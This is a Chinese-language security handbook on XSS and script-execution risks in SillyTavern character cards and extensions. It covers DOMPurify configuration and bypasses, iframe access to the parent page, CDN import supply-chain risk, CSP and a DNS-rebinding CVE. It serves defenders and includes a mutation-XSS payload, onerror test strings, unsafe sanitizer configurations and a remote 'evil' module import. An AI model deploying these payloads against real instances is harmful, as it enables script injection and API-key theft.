# 角色卡安全与 XSS 防护

> 文档版本：v1.0.0 ｜ 最后更新：2026-07-14

> 定位：SillyTavern 角色卡开发者与高级用户的安全参考手册。覆盖渲染管线 XSS 风险、DOMPurify 配置与绕过、卡内 JS 执行向量、本地成熟卡安全实战，以及用户侧自保方案。

---

## 置信度分级体系

**三级分类**
- **high**：多源交叉或运行时源码直接确认，可作为施工依据
- **medium**：单源或合理推断，可作参考但勿单独作为施工依据
- **low**：孤证、无独立来源，**禁止基于此施工**

**依据类型轴**：`[运行时源码]` / `[真机]` / `[文档·多源]` / `[文档·单源]` / `[社区]` / `[推断]`

**收集日期**：2026-06-28
**回源基准**：SillyTavern v1.14.0 + 本地成熟卡（星月 2.5.0 / 交错 2.6.0）

---

## 目录

1. 渲染管线与整体机制
   - 1.1 ST 消息渲染管线
   - 1.2 角色卡数据格式
2. DOMPurify 净化范围与已知绕过
   - 2.1 ST 的 DOMPurify 配置
   - 2.2 默认保护范围
   - 2.3 已确认 CVE 绕过
   - 2.4 配置误用导致绕过
   - 2.5 ADD_TAGS + MathML 组合风险
3. 卡内 JS 执行风险面
   - 3.1 正则扩展（Regex Extension）
   - 3.2 STScript `/run`
   - 3.3 Code Runner 扩展
   - 3.4 `import()` 远程 ESM
   - 3.5 iframe 使用
4. 本地生产卡安全实战代码解析
   - 4.1 正确做法：`escapeHtml()` 统一转义
   - 4.2 正确做法：`textContent` / `style.textContent` 安全路径
   - 4.3 风险点：未转义路径
5. PNG 内嵌脚本风险
6. 第三方 CDN import 风险
7. CSP 现状
8. DNS 重绑定攻击（CVE-2025-59159）
9. 关键 API 参考表
10. 完整可用范式代码
11. 高频避坑清单
12. 悬案（A/D 仍需真机验证；B/C/E 已解除）
13. 用户侧自保方案
14. 来源汇总

---

## 1. 渲染管线与整体机制

### 1.1 ST 消息渲染管线

**核心结论**

ST 的渲染链为：

```
LLM 输出
  → 正则扩展（Regex Extension）替换     ← 先于 Markdown 转换
  → Showdown（Markdown → HTML）
  → DOMPurify.sanitize()
  → innerHTML 插入 DOM
```

> **注意**：正则扩展替换发生在 Showdown 之**前**（即处理的是原始 Markdown 字符串，而非 HTML）。扩展 hook（MESSAGE_RECEIVED）在消息写入 DOM **后**触发，此时 DOMPurify 已完成净化；但 hook 内若再次直接操作 DOM（如 jQuery `.html()`），其内容不再经过 DOMPurify。`renderExtensionTemplateAsync()` 内置 DOMPurify 净化，是扩展模板的安全渲染入口。

| 阶段 | 是否 XSS 净化 | 备注 |
|---|---|---|
| 正则扩展替换 | 否 | 在原始 Markdown 上操作，替换字符串可含任意文本 |
| Showdown Markdown 转 HTML | 否 | 仅语法转换 |
| DOMPurify.sanitize() | 是 | 最终净化关卡 |
| 扩展 hook（MESSAGE_RECEIVED）后续 DOM 写入 | 否 | 若 hook 内再次 .html() 写入则绕过净化 |
| `renderExtensionTemplateAsync()` | 是 | 内置净化，推荐用于模板 |

来源：ST 1.14.0 `public/script.js` 第 1674 行（`getRegexedString` 调用）→ 第 1745 行（`converter.makeHtml`）→ 第 1773 行（`DOMPurify.sanitize`）[运行时源码]；ST 官方扩展文档 https://docs.sillytavern.app/for-contributors/writing-extensions/ [文档·多源]
适用版本：ST 1.14.0（源码直读）
**置信度：high · [运行时源码]**

### 1.2 角色卡数据格式

**核心结论**

PNG 角色卡通过 tEXt chunk 存储 JSON（字段 `chara`）或 CHARX（ZIP 内 JSON + 资产）。字段内容（角色描述、示例对话、世界书条目）均为纯文本，注入 LLM 提示词，**不在前端直接渲染为 HTML**。ST 加载时仅解析 JSON，不执行字段内容。

正则脚本（`data.extensions.regex`）和快捷回复（Quick Reply）在卡导入时由 ST 显式弹框提示用户确认，确认后才生效。

来源：CCv3 规范 https://github.com/kwaroran/character-card-spec-v3
适用版本：ST 1.x（支持 CCv3 起）
**置信度：high · [文档·多源]**

---

## 2. DOMPurify 净化范围与已知绕过

### 2.1 ST 的 DOMPurify 配置

**核心结论**

ST 1.14.0 的 `messageFormatting()`（`public/script.js`）调用 `DOMPurify.sanitize(mes, config)`，config 中：
- `ADD_TAGS: ['custom-style']`（**仅此一个自定义标签**，不含 `now_plot`、`world_situation` 等）
- `MESSAGE_SANITIZE: true`（自定义标志位，用于 hook 内判断是否处于消息净化模式）

通过 `addDOMPurifyHooks()`（`public/scripts/chats.js`）注册两个 hook：
1. `uponSanitizeAttribute`：`MESSAGE_SANITIZE` 模式下，将 class 值中的自定义类名加 `custom-` 前缀（防止类名与 ST 内部类冲突）
2. `uponSanitizeElement`：`MESSAGE_SANITIZE` 模式下，将 `HTMLUnknownElement` 内的文本换行符转为 `<br>` 元素；外部媒体被禁用时，屏蔽 img/audio/video/embed/object 等媒体元素的外链 src

`<style>` 标签通过 `encodeStyleTags()` 先编码为 `<custom-style>%URL_ENCODED%</custom-style>`，经 DOMPurify 保留，再由 `decodeStyleTags()` 解码并用 `@adobe/css-tools` 解析选择器加前缀（作用域隔离）。

> 草稿原说 ADD_TAGS 含 `now_plot`、`world_situation` 等，源码中不存在，已更正。

来源：ST 1.14.0 `public/script.js` 第 1764–1773 行、`public/scripts/chats.js` 第 1906–1977 行 [运行时源码]
适用版本：ST 1.14.0（源码直读）
**置信度：high · [运行时源码]**

### 2.2 默认保护范围

**核心结论**

DOMPurify 默认净化范围（无需额外配置即生效）：

| 净化对象 | 说明 |
|---|---|
| `<script>` 标签 | 移除 |
| `<style>` 内 `expression()` | 移除 |
| `<object>`、`<embed>` | 移除 |
| 所有事件属性 `onclick`、`onerror`、`onload` 等 | 移除 |
| `javascript:` URI | 移除 |
| `data:` URI | 默认禁用（ALLOW_DATA_ATTR 关闭） |

来源：DOMPurify 官方文档（多源交叉）
适用版本：DOMPurify 2.x / 3.x
**置信度：high · [文档·多源]**

### 2.3 已确认 CVE 绕过

**核心结论**

| CVE | 影响版本 | 攻击机制 | 修复版本 |
|---|---|---|---|
| CVE-2024-47875 | < 2.5.0 / < 3.1.3 | 深层嵌套 mXSS（math/svg/foreignObject/iframe） | 2.5.0 / 3.1.3（限制嵌套深度 500） |
| CVE-2025-26791 | < 3.2.4 | `SAFE_FOR_TEMPLATES=true` + 模板字面量正则错误 → mXSS | 3.2.4 |

**CVE-2024-47875 触发 payload**：

```html
<math><annotation-xml encoding="application/xhtml+xml"><svg><foreignObject>
  <iframe srcdoc="<img src=x onerror=alert('xss')>" />
</foreignObject></svg></annotation-xml></math>
```

**CVE-2025-26791 触发条件**：需启用 `SAFE_FOR_TEMPLATES: true`。ST 1.14.0 默认配置中**不含此选项**（已从源码确认，原悬案 C 已解除），且 DOMPurify 版本为 3.2.6 已修复，ST 1.14.0 不受此 CVE 影响。

来源：
- CVE-2024-47875：https://www.cve.news/cve-2024-47875/
- CVE-2025-26791：https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251
- PortSwigger mXSS 研究：https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss

适用版本：DOMPurify < 3.2.4
**置信度：high · [文档·多源]**

### 2.4 配置误用导致绕过

**核心结论**

以下任何一种配置都会实质性降低 DOMPurify 保护等级：

```javascript
// 危险：允许事件处理器属性
DOMPurify.sanitize(input, { ADD_ATTR: ['onerror', 'onload'] });

// 危险：允许 script/noscript 标签
DOMPurify.sanitize(input, { ADD_TAGS: ['script'] });

// 危险：宽松 URI 白名单（允许 javascript: 协议）
DOMPurify.sanitize(input, { ALLOWED_URI_REGEXP: /.*/ });

// 危险：hook 中 forceKeepAttr = true（跳过正则过滤）
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  data.forceKeepAttr = true;
});

// 危险：hook 中 .setAttribute() 直接写入属性（绕过净化循环）
DOMPurify.addHook('afterSanitizeAttributes', node => {
  node.setAttribute('onmouseover', 'alert(1)'); // 新属性不再被扫描
});
```

**字符串后处理陷阱**：净化后对结果字符串做 replace 操作可能重构危险标签。例：Unicode 规范化 `ß → SS` 可重建 `</style>` 标签。正确做法：净化结果直接写入 DOM，不再做字符串变换。

来源：DOMPurify 配置误用分析 https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations
适用版本：DOMPurify 全版本（配置层面问题）
**置信度：high · [文档·多源]**

### 2.5 ADD_TAGS + MathML 组合风险

**核心结论**

> **ST 1.14.0 默认配置不受此风险影响**：源码确认 `ADD_TAGS` 仅含 `['custom-style']`，不含任何 MathML 标签（见 2.1 节），且 DOMPurify 版本为 3.2.6（已修复相关 CVE）。

理论上：若扩展开发者将 MathML 相关标签（`math`、`mtext`、`mglyph` 等）加入 `ADD_TAGS`，则旧版 DOMPurify（< 2.1）的 PortSwigger mXSS 向量（Chrome/Firefox 双向量）可被触发。此为**非默认场景的扩展开发者风险提示**，不适用于 ST 1.14.0 默认配置。

来源：PortSwigger mXSS 研究（单源）[文档·单源]；ADD_TAGS 现状来自 ST 1.14.0 源码 [运行时源码]
适用版本：仅当扩展/第三方配置手动加入 MathML 到 ADD_TAGS 时才相关
**置信度：medium · 推导未验证**（MathML + ADD_TAGS 组合场景为假设条件，ST 默认配置不触发）

---

## 3. 卡内 JS 执行风险面

### 3.1 正则扩展（Regex Extension）— 最大风险面

**核心结论**

正则替换的"Replace String"字段输出经完整 DOMPurify 管线净化，但：

- **替换字符串可含 HTML**：关闭"Show `<tags>` in responses"后，`<div>`/`<span>`/CSS 注入为设计功能
- 净化前不存在针对替换字符串的专项 XSS 过滤，完全依赖 DOMPurify 默认 config
- **恶意卡风险**：若 DOMPurify 版本 < 3.1.3，正则替换 payload 中的 mXSS 向量（CVE-2024-47875）可能绕过
- 正则脚本随卡导入时 ST 弹框提示用户确认，用户点击"确认"后即生效
- 精心构造的正则替换可输出 `<button data-xy-action="...">` 类元素，触发 ST 内部 action handler（见第 11 节避坑 10）

来源：ST 官方正则文档 https://docs.sillytavern.app/extensions/regex/
适用版本：ST 1.x
**置信度：medium · [文档·多源]**

### 3.2 STScript `/run` — 受控执行

**核心结论**

STScript 不直接执行 JavaScript，在受控斜杠命令框架内运行。`/run` 只能调用 Quick Reply 标签名，无法任意执行代码。

**实际可做的（恶意利用）**：
- `/gen`、`/genraw`：向 LLM API 发起请求，消耗 token
- `/trigger`：操控生成流
- 调用第三方扩展命令（图片生成、TTS）造成资源滥用

**不能做的**：直接访问文件系统、执行系统命令、运行任意 JavaScript。

来源：STScript 文档 https://docs.sillytavern.app/usage/st-script/
适用版本：ST 1.x
**置信度：medium · [文档·多源]**（STScript 不执行 JS 是文档级保证，但"可做"的恶意利用清单未经真机验证；`/run` 仅调 QR 名是文档明确约束）

### 3.3 Code Runner 扩展 — 高风险可选功能

**核心结论**

官方第三方扩展，允许从聊天 code block 执行：
- ` ```js ` → 通过 SandboxJS 沙盒运行 JavaScript
- ` ```stscript ` → 执行 STScript

**官方原话**："please don't run anything that looks too sussy"（官方承认沙盒非防弹级别）。

若启用此扩展，恶意卡通过正常 Markdown 代码块触发 JS 执行，沙盒逃逸风险不可排除。

来源：Code Runner 扩展 https://github.com/SillyTavern/Extension-CodeRunner（运行时源码）
适用版本：ST 1.x + Code Runner 扩展
**置信度：high · [运行时源码]**

### 3.4 `import()` 远程 ESM — 供应链风险

**核心结论**

> **版本说明**：`importFromUrl()` 辅助函数在 ST **1.14.0** 的 `public/scripts/` 目录中**不存在**（已逐文件搜索确认）。该函数可能存在于更高版本或第三方扩展中，具体引入版本需进一步核查。

浏览器原生 `import(url)` 加上 webpack `/* webpackIgnore: true */` 注释，可绕过 webpack 捆绑直接从任意 URL 动态加载 ES 模块——这是 JS 运行环境的能力，任何能执行 JS 的扩展/卡内脚本均可使用：

```javascript
// 扩展代码中的供应链风险用法
const module = await import(/* webpackIgnore: true */ 'https://cdn.jsdelivr.net/npm/evil@latest/index.js');
```

**风险链路**：扩展或卡内 JS 从 CDN/用户控制 URL 加载模块 → 供应链劫持（CDN 被污染、URL 被重定向）→ 任意代码执行。

**注意**：正则/世界书/卡片正文不能直接执行 JS，需通过扩展代码才能触发此路径。

来源：动态 `import()` 是 Web 标准能力，ST 扩展开发文档 [文档·多源]；`importFromUrl` 函数本身在 v1.14.0 中未找到 [运行时源码查找结果]
适用版本：ST 1.x（凡能执行扩展 JS 的版本均受影响）
**置信度：medium · 单源孤证**（`importFromUrl` 函数存在性未从 v1.14.0 源码确认；动态 import 能力本身 high）

### 3.5 iframe 使用（本地生产卡实战）

**核心结论**

星月/交错宙域卡使用 `window.frameElement`、`window.parent` 跨 iframe 通信（读取父框架 `CrossedZoneMediaLibrary`、`XingyueHudSettings` 等全局变量），这是 ST 渲染 HTML 世界书条目的正常机制（Tavern Helper/ST 将 HTML 渲染在 iframe 中）。

**安全观察**：
- iframe 内的脚本可通过 `window.parent` 读取父页面全局状态（如 ST 内部对象）
- 恶意卡若能将任意 HTML 渲染进 iframe，即可通过 `window.parent.SillyTavern.getContext()` 读取聊天记录、API 配置
- ST 本身对 iframe 内脚本是否设置 `sandbox` 属性为悬案（见第 12 节悬案 D）

来源：本地生产卡源码 `ST开发指南DB\本地证据\星月历史\2.9.1\components\status_bar_regex.html`（运行时源码）
适用版本：星月 2.9.1 / 交错 1.9.x
**置信度：high · [运行时源码]**

---

## 4. 本地生产卡安全实战代码解析

### 4.1 正确做法：`escapeHtml()` 统一转义

**核心结论**

`control_center.js`（第 1581 行）中定义并全局使用：

```javascript
function escapeHtml(value) {
  return String(value ?? '').replace(/[&<>"']/g, ch => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  }[ch]));
}
```

所有动态 HTML 拼接均通过 `escapeHtml()` 处理用户/LLM 数据（覆盖按钮文本、data 属性、pre 标签内容等），模式一致。这是正确的防护范式。

来源：`ST开发指南DB\本地证据\星月历史\2.9.1\components\control_center.js` 第 1581 行（运行时源码）
适用版本：星月 2.5.0+ / 交错 2.6.0+
**置信度：high · [运行时源码]**

### 4.2 正确做法：`textContent` / `style.textContent` 安全路径

**核心结论**

`omni_safe_block_renderer.js`（第 76 行）中：

```javascript
body.textContent = String(content || '').trim(); // 永远安全，无 XSS 面
```

CSS 注入通过 `style.textContent = css;` 而非 `style.innerHTML`，同样安全。

来源：`<local-user-path>/OneDrive\ST-\角色卡工作区\交错宙域\v1.9.3_20260526_002904\components\omni_safe_block_renderer.js` 第 76 行（运行时源码）
适用版本：交错 1.9.3+
**置信度：high · [运行时源码]**

### 4.3 风险点：未转义路径

**核心结论**

`status_bar_regex.html` 中存在以下未转义拼接模式：

**`htmlField()` 未转义**（第 2486-2503 行）：

```javascript
function htmlField(label, val) {
  // displayValue 返回普通字符串，无 HTML 转义
  return '<div class="char-field"><span class="char-field-label">' + label +
         '</span><span class="char-field-value">' + displayValue(val, '--') + '</span></div>';
}
```

**实际使用中的直接拼接**（第 2878-2881 行）：

```javascript
if (v['推测Tier强度']) html += '<span class="badge" ...>' + v['推测Tier强度'] + '</span>';
if (v['等级'])        html += '<span class="badge" ...>Lv ' + v['等级'] + '</span>';
if (v['HP'])          html += '<span class="badge" ...>HP ' + v['HP'] + '</span>';
```

LLM 输出的变量值（如 `v['等级']`）直接拼入 innerHTML，未经转义。

**实际威胁评估**：这些变量来自 ST `getVariables()`，其值由 LLM 写入，理论上可包含 HTML。根据源码分析（见第 12 章悬案 A 说明），jQuery `.html()` 写入发生在 DOMPurify 净化**之后**，悲观派立场更有支撑——即 LLM 注入的 HTML 字符可能直接执行。仍需真机验证最终效果。

**`attrValue()` 做了属性转义但不完整**（第 2126 行）：

```javascript
function attrValue(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
  // 注：缺少 > 和 ' 的转义，但 HTML attribute 上下文基本够用
}
```

**`cssValue()` 过滤不完整**（第 2134 行）：

```javascript
function cssValue(value) {
  return String(value == null ? '' : value).replace(/[;"'<>]/g, '');
  // 用于 style="--cz-media-fallback-color:..." 插值
  // 未过滤 url()、expression()、var() 等 CSS 注入向量
}
```

来源：`ST开发指南DB\本地证据\星月历史\2.9.1\components\status_bar_regex.html`（运行时源码）
适用版本：星月 2.9.1
**置信度：high · [运行时源码]**

---

## 5. PNG 内嵌脚本风险

**核心结论**

PNG 角色卡的 tEXt chunk 存储的 JSON 字段内容是纯文本字符串，不是可执行代码。加载时 ST 仅解析 JSON，不执行任何字段内容。

**真实威胁面（由高到低）**：

| 威胁 | 触发条件 | 用户提示 |
|---|---|---|
| HTML 世界书条目（卡内 iframe） | Tavern Helper 渲染为 iframe HTML | 无单独提示（随卡整体导入） |
| 内嵌正则脚本（`data.extensions.regex`） | 卡导入时 | 有弹框确认 |
| Quick Reply 嵌入内容 | 卡导入时 | 有弹框确认 |
| 伪装成描述文本的 STScript 指令 | 用户点击恶意按钮时 | 无（依赖用户不点击） |

**检查工具**：https://github.com/Barafu/tavern_card_tools（命令行打印 PNG 内 JSON 内容）

来源：CCv3 规范 + 本地源码审查
适用版本：ST 1.x（支持 CCv3 起）
**置信度：medium · [文档·多源]**

---

## 6. 第三方 CDN import 风险

**核心结论**

已发生真实事件：Bot Browser 扩展（2024-2025）通过 ST 1.17 以前的备份系统漏洞外泄 API key，导致用户账号余额被清空。

**风险链路**：

```
恶意扩展/卡
  → import(CDN_URL)（importFromUrl 或直接 dynamic import）
  → 恶意 ES 模块加载执行
  → 读取 extensionSettings（含所有扩展配置，明文存储）
  → fetch() 外泄到攻击者服务器
  → API key 泄露 → 账号盗刷
```

**可访问数据**：

| 数据 | 访问方式 | 风险级别 |
|---|---|---|
| `extensionSettings` | `getContext().extensionSettings` | 高（含 API 配置） |
| 角色卡数据 | `getContext().characters` | 中 |
| 聊天记录 | `getContext().chat` | 中 |
| DOM 中渲染的 API key 输入框 | `document.querySelector(...)` | 高 |

**官方警告**："Never store API keys in extensionSettings"——任何有读取 `getContext()` 能力的扩展/卡均可访问 extensionSettings。

**CDN 供应链具体风险**：
- `import('https://cdn.jsdelivr.net/npm/xxx@latest/index.js')` → latest tag 被劫持
- `@unpkg` / `@esm.sh` 的恶意包 → 动态 import 后立即执行数据外泄

来源：ST 官方安全讨论 https://github.com/SillyTavern/SillyTavern/discussions/5592（社区·真实事件）
适用版本：ST < 1.17.0（备份漏洞已修复）；CDN import 风险持续存在
**置信度：high · [文档·多源]**

---

## 7. CSP 现状

**核心结论（推断）**

官方文档和 DeepWiki 均未提及 ST 设置 Content-Security-Policy 响应头。ST 服务端（Node.js/Express）的安全机制集中在：IP 白名单、Host Header 验证（hostWhitelist，默认关闭）、CSRF double-submit token、基础认证。

**推断：ST 当前未设置严格 CSP。**

缺少 CSP 的实际影响：

| CSP 指令 | 缺失影响 |
|---|---|
| `script-src` | inline script 和动态 `import()` 均可执行 |
| `connect-src` | `fetch()` 可向任意外部域发请求 |
| `frame-src` | 卡内 iframe 可加载任意内容 |

**若要自行添加 CSP**（用户侧加固方案，注意 ST 本体大量使用内联脚本，严格 CSP 会破坏功能）：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  connect-src 'self' https://your-api-endpoint;
  frame-src 'self';
  img-src 'self' data: blob: https:;
  style-src 'self' 'unsafe-inline';
```

严格 CSP 需要 nonce 方案配合，直接添加上述规则会破坏 ST 功能。真机验证路径：在 ST Express server 中间件加 `res.setHeader('Content-Security-Policy', ...)` 逐步观察。

来源：ST 服务端源码（推断）+ 通用 Web 安全规范
适用版本：ST 1.x
**置信度：medium · [推断]**

---

## 8. DNS 重绑定攻击（CVE-2025-59159）

**核心结论**

CVSS **9.6**（官方安全公告值；第三方媒体报道有标 9.7 的误差），影响 ST ≤ 1.13.3，1.13.4 修复（引入 hostWhitelist，**默认关闭**）。

**攻击链**：

```
1. 攻击者注册域名，TTL 设极短（< 60s）
2. 受害者访问恶意页面
3. JS payload 等待 DNS rebind（域名解析切换到 127.0.0.1）
4. 同源策略被绕过，JS 直接调用本地 ST API
5. 安装恶意扩展 → 任意代码执行
   读取聊天/API key → 数据外泄
   注入钓鱼 HTML → 社会工程
```

**防护配置**（`config.yaml`）：

```yaml
hostWhitelist:
  enabled: true
  whitelist:
    - localhost
    - 127.0.0.1
    - "::1"
```

**重要**：即使已更新到 ≥ 1.13.4，hostWhitelist 默认关闭，用户必须手动开启。

来源：
- ST 安全公告 https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-7cxj-w27x-x78q
- CVE-2025-59159 详情 https://securityonline.info/critical-flaw-cve-2025-59159-cvss-9-7-in-sillytavern-allows-full-remote-control-of-local-ai-instances/

适用版本：ST ≤ 1.13.3（高危）；≥ 1.13.4 但未开 hostWhitelist（中危）
**置信度：high · [文档·多源]**

---

## 9. 关键 API 参考表

| API / 字段 | 作用 | 安全级别 | 备注 |
|---|---|---|---|
| `DOMPurify.sanitize(html)` | XSS 净化，默认配置 | 安全 | 需保持库版本 ≥ 3.2.4 |
| `DOMPurify.sanitize(html, {ADD_TAGS:[...]})` | 允许额外标签 | 有条件安全 | ADD_TAGS 含 MathML 时风险升高 |
| `DOMPurify.sanitize(html, {ADD_ATTR:['onerror']})` | 允许事件属性 | 危险 | 直接绕过净化 |
| `element.textContent = val` | 纯文本写入 | 安全 | 永不 XSS，推荐首选 |
| `element.innerHTML = val` | HTML 写入 | 危险 | 必须先经 DOMPurify 或 escapeHtml |
| `style.textContent = css` | CSS 安全注入 | 安全 | 不解析 HTML |
| `style.innerHTML = css` | CSS 不安全注入 | 有风险 | 避免使用 |
| `import(/* webpackIgnore: true */ url)` | 远程 ESM 加载 | 高危 | 无域名限制，供应链风险 |
| `renderExtensionTemplateAsync()` | 扩展模板渲染 | 安全 | 内置 DOMPurify，推荐 |
| `SillyTavern.libs.DOMPurify` | 访问 ST 内置 DOMPurify | 推荐方式 | 避免版本不一致 |
| `window.parent.CrossedZoneHudSettings` | 跨 iframe 访问父全局变量 | 有风险 | 恶意 iframe 可读父页面状态 |
| `getContext().extensionSettings` | 读取所有扩展配置 | 高风险数据 | 含明文 API 相关配置，勿存 key |

---

## 10. 完整可用范式代码

### 10.1 卡内安全 HTML 拼接模式（生产级）

```javascript
// 来自 control_center.js:1581 — 生产验证
function escapeHtml(value) {
  return String(value ?? '').replace(/[&<>"']/g, ch => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
  }[ch]));
}

// 正确：LLM/用户数据经转义后拼入 innerHTML
element.innerHTML = '<div class="badge">' + escapeHtml(v['等级']) + '</div>';

// 错误（生产卡已存在）：未转义直接拼接 — XSS 风险
element.innerHTML = '<div class="badge">' + v['等级'] + '</div>';
```

### 10.2 安全 DOM 构建（避免字符串拼接）

```javascript
// 来自 omni_safe_block_renderer.js — 生产验证
const body = document.createElement('div');
body.textContent = String(content || '').trim(); // 零 XSS 面

// CSS 安全注入
const style = document.createElement('style');
style.textContent = cssString; // 不是 style.innerHTML
document.head.appendChild(style);
```

### 10.3 DOMPurify 在扩展中的标准用法

```javascript
// 官方推荐模式
const { DOMPurify } = SillyTavern.libs;

// 默认配置（最安全）
const clean = DOMPurify.sanitize(userHtml);

// 允许自定义标签（ST 1.14.0 内部仅用 'custom-style'；如扩展需要其他标签可按需添加）
const clean = DOMPurify.sanitize(userHtml, {
  ADD_TAGS: ['custom-style'],  // ST 1.14.0 源码实际值；勿随意添加 MathML 等高风险标签
  // 绝对不加 ADD_ATTR: ['onerror'] 等事件属性
});

// 写入 DOM
element.innerHTML = clean;
```

### 10.4 CSS 值插值安全处理（增强版）

```javascript
// 现有卡的 cssValue（不足，缺少 url()/expression() 过滤）
function cssValue(value) {
  return String(value ?? '').replace(/[;"'<>]/g, '');
}

// 更安全的 CSS 属性值处理（推荐替换）
function safeCssValue(value) {
  return String(value ?? '')
    .replace(/url\s*\(/gi, '')        // 禁止 url() CSS 注入
    .replace(/expression\s*\(/gi, '') // 禁止 IE expression
    .replace(/[;"'<>\\]/g, '');       // 移除基本危险字符
}

// 使用：style="--my-color:${safeCssValue(colorFromLLM)}"
```

### 10.5 卡内 fetch 安全白名单模式

```javascript
// 限制 fetch 目标域，防止意外数据外泄
const ALLOWED_ORIGINS = ['https://your-gateway.example.com'];

async function safeFetch(url, options) {
  const parsed = new URL(url);
  if (!ALLOWED_ORIGINS.includes(parsed.origin)) {
    throw new Error('不允许的外部请求: ' + parsed.origin);
  }
  return fetch(url, { credentials: 'include', ...options });
}
```

---

## 11. 高频避坑清单

1. **`innerHTML = LLM值`，不经任何转义**（高危）
   LLM 输出可能包含 `<img src=x onerror=...>`。本地生产卡 `status_bar_regex.html` 中存在此模式（见第 4.3 节）。
   修复：改用 `escapeHtml(val)` 包裹，或改用 `textContent`。

2. **DOMPurify 版本过旧**（高危）
   < 3.1.3 受 CVE-2024-47875（mXSS math/svg 嵌套）影响。ST 内置 DOMPurify 版本需单独确认（在 ST `public/lib.js` 中搜索版本字符串）。

3. **`ADD_ATTR` 包含事件属性**（极危）
   任何 `onerror`/`onload`/`onclick` 加入 ADD_ATTR → 直接 XSS，无需复杂向量。

4. **净化后对字符串做 replace 操作**（高危）
   可重构危险标签（如 Unicode 规范化攻击）。正确做法：净化结果直接写入 DOM，不再做字符串变换。

5. **hook 中 `node.setAttribute()` 写入属性**（高危）
   绕过净化循环，新写入的属性不被 DOMPurify 再次扫描。

6. **`importFromUrl()` 使用外部 CDN 且无完整性校验**（高危）
   无 SRI（Subresource Integrity）保护。推荐只 import `'self'` 域名下的模块，或加 integrity 验证。

7. **`extensionSettings` 明文存储密钥**（高危）
   官方明确警告。任何有读取 `getContext()` 能力的扩展/卡均可访问。密钥应由用户在 ST 界面输入，不应存入 extensionSettings。

8. **hostWhitelist 默认关闭**（高危）
   DNS 重绑定攻击（CVE-2025-59159）对所有不开 hostWhitelist 的实例均有效，即使 ST 版本已 ≥ 1.13.4。用户必须手动在 `config.yaml` 开启。

9. **第三方扩展无沙盒**（高危）
   扩展运行在完整 DOM 上下文，可读写任何页面元素。Code Runner 扩展的"沙盒"非防弹（开发者原话），启用需完全信任来源。

10. **正则脚本含嵌套 data 属性 + 事件绑定**（中危）
    正则替换可输出 `<button data-xy-action="...">` 类元素，ST 内部 JS 会响应这些 data 属性执行内部 action handler。恶意卡可通过精心构造的正则替换触发意外操作。

---

## 12. 悬案（A/D 仍需真机验证；B/C/E 已解除）

### 悬案 A：`status_bar_regex.html` 的渲染点是否在 DOMPurify 之前？

**结论倾向（源码佐证，悲观派立场更有支撑）**

ST 1.14.0 源码（`public/script.js` 第 3441 行）：
```javascript
await eventSource.emit(event_types.MESSAGE_RECEIVED, this.messageId, this.type);
```
此 emit 在 `addCopyToCodeBlocks` 等 DOM 操作**之后**发生，意味着 `MESSAGE_RECEIVED` 钩子触发时，DOMPurify 净化已完成、消息 HTML 已写入 DOM。

**因此**：`status_bar_regex.html` 若通过 `MESSAGE_RECEIVED` 钩子触发渲染，其 jQuery `.html(v['等级'])` 调用发生在 DOMPurify **之后**，LLM 写入的变量值不经任何净化直接注入 DOM——**悲观派成立**。

**仍需真机验证**：ST 变量值写入链路（`getVariables()` → 变量 dict → 渲染函数）中是否存在其他隐式转义；以及是否有浏览器 Content-Security-Policy 兜底（见第 7 章）。

**建议修复**：`status_bar_regex.html` 中所有直接拼接 `v['字段名']` 的位置均应改用 `escapeHtml()`（参见 4.1 节的 `control_center.js` 范式）。

**验证路径**：
1. 构造一个 LLM 会写入 `v['等级'] = '<img src=x onerror="alert(1)">'` 的角色卡
2. 在 ST 真机中观察是否弹出 alert
3. 或在 ST console 中：`document.querySelector('.badge').innerHTML`（如果是 img 元素则 XSS 成功）

### ~~悬案 B：ST 内置 DOMPurify 版本~~（已解除）

**已确认**：ST 1.14.0 的 `node_modules/dompurify/package.json` 版本字段为 **3.2.6**，高于修复 CVE-2024-47875 的 3.1.3 和修复 CVE-2025-26791 的 3.2.4，两个 CVE 均已修复。

来源：`<local-user-path>/OneDrive\ST-\SillyTavern-1.14.0\node_modules\dompurify\package.json` 第 144 行 [运行时源码]

### ~~悬案 C：DOMPurify 的 `SAFE_FOR_TEMPLATES` 是否启用~~（已解除）

**已确认**：ST 1.14.0 `messageFormatting` 中的 DOMPurify config 对象（`public/script.js` 第 1764–1771 行）不含 `SAFE_FOR_TEMPLATES` 字段。此外，DOMPurify 版本已是 3.2.6（高于修复版本 3.2.4），CVE-2025-26791 不适用于 ST 1.14.0。

来源：ST 1.14.0 `public/script.js` 第 1764–1771 行；`node_modules/dompurify/package.json` [运行时源码]

### 悬案 D：卡内 iframe 的 `sandbox` 属性

**问题**：ST/Tavern Helper 在渲染卡内 HTML 为 iframe 时，是否设置了 `sandbox` 属性限制？若无 `sandbox`（或 sandbox 包含 `allow-scripts`），iframe 内 JS 完整执行，可通过 `window.parent` 访问父页面。

**两派立场**：
- 有 sandbox：Tavern Helper 作为受控渲染器，应限制 iframe 权限
- 无 sandbox：卡内 JS 需要 `window.parent` 访问，sandbox 会破坏功能

**验证路径**：在 ST 真机 DevTools 中检查渲染的 `<iframe>` 元素属性，确认是否有 `sandbox` 属性及其值。

### ~~悬案 E：`ADD_TAGS` 是否含 MathML 标签~~（已解除）

**已确认**：ST 1.14.0 `public/script.js` 的 `messageFormatting()` 中，`ADD_TAGS` 仅含 `['custom-style']`，**不含任何 MathML 标签**（math、mtext、mglyph 等）。PortSwigger MathML mXSS 向量在默认配置下不适用（需用户/扩展显式添加 MathML 到 ADD_TAGS 才会触发）。

来源：ST 1.14.0 `public/script.js` 第 1769 行 [运行时源码]

---

## 13. 用户侧自保方案

优先级由高到低：

1. **更新 ST 到 ≥ 1.17.0**（必须）：修复 Bot Browser 类漏洞 + 多项安全增强
2. **开启 hostWhitelist**（高优先级）：`config.yaml` 设 `hostWhitelist.enabled: true`，白名单填 `localhost` / `127.0.0.1` — 防 DNS 重绑定（CVE-2025-59159）
